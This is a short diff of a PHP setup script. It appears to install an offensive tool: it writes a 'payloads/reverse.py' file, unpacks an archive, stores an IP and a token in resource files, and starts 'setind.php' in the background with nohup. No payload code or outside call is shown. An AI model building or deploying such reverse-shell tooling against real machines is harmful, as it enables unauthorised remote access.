@@ -65,6 +65,10 @@ file_put_contents("payloads/reverse.py", $a);
 
 exec("unzip nnnet.zip");
 exec("unlink nnnet.zip");
+
+file_put_contents("resources/ip.txt","$ip");
+file_put_contents("resources/token.txt","$token");
+
 exec("nohup php setind.php --name $ip > output.log 2>&1");
 echo "\n";
 ?>
